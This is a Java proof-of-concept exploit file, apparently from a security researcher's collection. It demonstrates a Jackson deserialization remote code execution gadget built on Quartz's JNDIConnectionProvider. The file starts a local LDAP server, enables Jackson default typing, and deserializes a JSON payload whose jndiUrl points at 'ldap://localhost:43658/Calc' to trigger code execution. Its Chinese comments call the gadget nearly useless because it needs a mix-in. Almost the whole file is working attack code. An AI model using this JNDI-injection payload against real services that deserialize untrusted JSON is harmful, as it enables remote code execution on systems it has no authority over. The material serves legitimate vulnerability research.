package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;
import org.quartz.utils.JNDIConnectionProvider;

/**
 * 比鸡肋还鸡肋的gadget
 *
 * @author threedr3am
 */
public class QuartzPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    //复现是复现了，但是这样的payload恕我直言，比鸡肋还鸡肋
    mapper.addMixIn(JNDIConnectionProvider.class, AbstractJNDIConnectionProvider.class);
    String json = "[\"org.quartz.utils.JNDIConnectionProvider\", {\"jndiUrl\": \"ldap://localhost:43658/Calc\"}]";
    mapper.readValue(json, Object.class);
  }


}
abstract class AbstractJNDIConnectionProvider extends JNDIConnectionProvider{
  @JsonCreator
  public AbstractJNDIConnectionProvider( @JsonProperty("jndiUrl") String jndiUrl, @JsonProperty ("alwaysLookup") boolean alwaysLookup) {
    super(jndiUrl, alwaysLookup);
  }
}
